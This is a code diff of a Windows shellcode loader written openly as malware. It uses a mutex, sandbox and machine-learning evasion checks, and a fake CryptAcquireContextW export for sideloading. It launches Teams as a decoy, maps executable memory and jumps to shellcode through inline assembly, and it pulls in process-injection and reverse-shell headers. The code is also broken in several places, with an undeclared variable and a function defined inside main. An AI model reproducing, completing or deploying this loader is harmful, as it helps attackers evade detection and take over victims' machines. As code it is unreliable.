@@ -1,17 +1,14 @@
 #include <windows.h>
 #include <tlhelp32.h>
 
+#include "mapinject.h"
+#include "reverse_shell.h"
+
 // Constants
 #define PSIZE 1024
-#define PAYLOAD_PATH "path_to_payload_file"
 
 // Mutex name
 #define MUTEX_NAME TEXT("WindowsProc")
-
-// External C function declaration
-extern "C" {
-    __declspec(dllexport) void CryptAcquireContextW();
-}
 
 // Mutex management
 void checkMutex() {
@@ -142,22 +139,6 @@ bool isSandboxArtifactPresent() {
     return false;
 }
 
-
-/*
-
-    Encapsulation Section
-
-*/
-
-
-
-// Decrypt shellcode from file
-int decrypt_shellcode_from_file(char* payload, const char* path) {
-    // TODO: Decryption logic and file read
-    return 0; // Adjust return value as needed
-}
-
-
 /*
 
     Injection and running section
@@ -166,11 +147,13 @@ int decrypt_shellcode_from_file(char* payload, const char* path) {
 
 // Execute Teams.exe
 void execute_Teams() {
-    // Placeholder for your Teams execution logic...
+    system("teams.exe");
 }
 
-// External C function definition
-extern "C" {
+// Your main function or other parts of the program...
+int main() {
+    // TODO: Finish main statement
+    
     __declspec(dllexport) void CryptAcquireContextW() {
         char payload[PSIZE];
 
@@ -178,34 +161,34 @@ extern "C" {
         checkMutex();
 
         // Evade ML and Sandboxing checks
-        stale();
+        if (stale() == 1)
+        {
+            return 0;
+        };
 
-        // Recover payload from file
-        if (decrypt_shellcode_from_file(payload, PAYLOAD_PATH) == 0) {
-
-            // Execute Teams.exe to mimic legitimate behavior
+            /*
+            OLD CODE
+            if (get_shellcode_from_file(payload, PAYLOAD_PATH) == 0) {
             execute_Teams();
-
-            // Shellcode execution
             HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(payload), NULL);
             LPVOID lpMapAddress = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, sizeof(payload));
             memcpy((PVOID)lpMapAddress, payload, sizeof(payload));
+            */
 
-            // Execute shellcode
-            __asm
-            {
-                mov eax, lpMapAddress
-                push eax;
-                ret
-            }
+        // run teams to mimic legitimate behavior
+        execute_Teams();
+
+        // Inject process
+        mapinject()
+
+
+        // Execute shellcode
+        __asm
+        {
+            mov eax, lpMapAddress
+            push eax;
+            ret
         }
     }
-}
-
-// Your main function or other parts of the program...
-int main() {
-
-    // TODO: Write main statement
-
     return 0;
 }
